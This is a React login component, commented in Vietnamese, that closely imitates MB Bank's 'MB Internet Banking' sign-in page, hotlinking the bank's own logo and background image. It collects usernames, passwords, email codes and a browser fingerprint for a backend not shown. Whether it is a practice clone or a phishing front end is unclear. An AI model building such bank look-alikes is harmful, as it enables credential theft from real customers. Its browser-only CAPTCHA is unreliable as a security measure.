import { useState, useEffect } from "react";
import { useAuth } from "../../context/context"; // Đảm bảo đường dẫn đúng
import "./Login.css";
import FingerprintJS from '@fingerprintjs/fingerprintjs'; // Import FingerprintJS

export default function Login() {
  const { login, verifyLogin } = useAuth(); // Destructure verifyLogin từ useAuth
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [userCaptchaInput, setUserCaptchaInput] = useState("");
  const [randomCaptcha, setRandomCaptcha] = useState("");
  const [error, setError] = useState("");
  const [captchaError, setCaptchaError] = useState("");
  const [deviceId, setDeviceId] = useState(null); // State để lưu device ID
  const [showVerification, setShowVerification] = useState(false); // State để kiểm soát hiển thị input mã xác minh
  const [verificationCode, setVerificationCode] = useState(""); // State cho input mã xác minh
  const [tempUsername, setTempUsername] = useState(""); // Lưu username tạm thời cho bước xác minh

  // Hàm tạo chuỗi CAPTCHA ngẫu nhiên
  const generateCaptcha = () => {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < 6; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    setRandomCaptcha(result);
    setUserCaptchaInput(""); // Xóa input của người dùng khi tạo CAPTCHA mới
    setCaptchaError(""); // Xóa lỗi CAPTCHA cũ
  };

  // Tạo CAPTCHA và lấy deviceId khi component được mount
  useEffect(() => {
    generateCaptcha();
    const loadFingerprint = async () => {
      try {
        const fp = await FingerprintJS.load();
        const result = await fp.get();
        setDeviceId(result.visitorId);
      } catch (err) {
        console.error("Error loading FingerprintJS:", err);
        // Xử lý lỗi, có thể đặt một deviceId mặc định hoặc hiển thị thông báo
        setDeviceId("unknown_device"); // Fallback nếu không lấy được deviceId
      }
    };
    loadFingerprint();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();

    // Kiểm tra CAPTCHA trước khi gửi form
    if (userCaptchaInput.toLowerCase() !== randomCaptcha.toLowerCase()) {
      setCaptchaError("Mã kiểm tra không đúng.");
      setError(""); // Xóa lỗi API nếu có
      return;
    }

    setCaptchaError(""); // Xóa lỗi CAPTCHA nếu đúng
    setError(""); // Xóa lỗi API trước khi gọi login

    if (showVerification) {
      // Xử lý khi đang ở chế độ xác minh mã
      const result = await verifyLogin(tempUsername, verificationCode, deviceId);
      if (result.success) {
        alert("Đăng nhập thành công!"); // Thay thế bằng chuyển hướng thực tế
        // Reset tất cả các trạng thái sau khi đăng nhập thành công
        setUsername("");
        setPassword("");
        setUserCaptchaInput("");
        setVerificationCode("");
        setRandomCaptcha("");
        generateCaptcha();
        setShowVerification(false);
        setTempUsername("");
      } else {
        setError(result.message);
      }
    } else {
      // Xử lý đăng nhập ban đầu
      const result = await login(username, password, deviceId);
      if (result.success) {
        alert("Đăng nhập thành công!"); // Thay thế bằng chuyển hướng thực tế
        // Reset trạng thái sau khi đăng nhập thành công
        setUsername("");
        setPassword("");
        setUserCaptchaInput("");
        setRandomCaptcha("");
        generateCaptcha();
      } else {
        if (result.errorType === "New equipment") {
          // Nếu là thiết bị mới, chuyển sang chế độ xác minh
          setShowVerification(true);
          setTempUsername(username); // Lưu username để dùng cho bước xác minh
          setError(result.message); // Hiển thị thông báo về thiết bị mới
          setPassword(""); // Xóa mật khẩu để bảo mật
          setUserCaptchaInput(""); // Xóa input captcha
          generateCaptcha(); // Tạo captcha mới cho bước xác minh
        } else {
          setError(result.message);
        }
      }
    }
  };

  // Xác định trạng thái disabled của nút đăng nhập
  const isLoginButtonDisabled =
    (showVerification && (!tempUsername || !verificationCode || !userCaptchaInput || userCaptchaInput.toLowerCase() !== randomCaptcha.toLowerCase())) ||
    (!showVerification && (!username || !password || !userCaptchaInput || userCaptchaInput.toLowerCase() !== randomCaptcha.toLowerCase()));

  return (
    <div className="login-wrapper">
      <div className="login-left">
        <img src="https://online.mbbank.com.vn/back-ground-login-1.650d9a73937776ef.jpg" alt="ekyc" className="ekyc-img" />
      </div>
      <div className="login-right">
        <div className="login-form-wrapper">
          <div className="login-form">
            <img src="https://online.mbbank.com.vn/assets/images/logo-blue.svg" alt="MB Bank Logo" className="logo" />
            <h3>Chào mừng bạn đến với</h3>
            <h2><strong>MB Internet Banking</strong></h2>
            {error && <p className="error">{error}</p>}
            {captchaError && <p className="error">{captchaError}</p>} {/* Hiển thị lỗi CAPTCHA */}
            <form onSubmit={handleSubmit}>
              <input
                type="text"
                placeholder="TÊN ĐĂNG NHẬP"
                value={username}
                onChange={(e ) => setUsername(e.target.value)}
                required
                disabled={showVerification} // Vô hiệu hóa input username khi đang xác minh
              />
              {!showVerification && ( // Chỉ hiển thị input mật khẩu khi không ở chế độ xác minh
                <input
                  type="password"
                  placeholder="Nhập mật khẩu"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
              )}

              {showVerification && ( // Hiển thị input mã xác minh khi cần
                <input
                  type="text"
                  placeholder="Mã xác minh từ Email"
                  value={verificationCode}
                  onChange={(e) => setVerificationCode(e.target.value)}
                  required
                />
              )}

              <div className="captcha-row">
                {/* Hiển thị CAPTCHA ngẫu nhiên */}
                <div className="captcha-display">{randomCaptcha}</div>
                <input
                  type="text"
                  placeholder="NHẬP MÃ KIỂM TRA"
                  value={userCaptchaInput}
                  onChange={(e) => setUserCaptchaInput(e.target.value)}
                  required
                />
                <button type="button" className="refresh-btn" onClick={generateCaptcha}>
                  ↻
                </button>
              </div>
              <button type="submit" className="submit-btn" disabled={isLoginButtonDisabled}>
                {showVerification ? "Xác minh & Đăng nhập" : "Đăng nhập"}
              </button>
            </form>
          </div>
        </div>
        <div className="footer-links-wrapper">
          <div className="footer-links">
            <a href="#">Kết nối với chúng tôi</a> |
            <a href="#"> Điều khoản và điều kiện</a> |
            <a href="#"> An toàn bảo mật</a>
          </div>
        </div>
      </div>
    </div>
  );
}
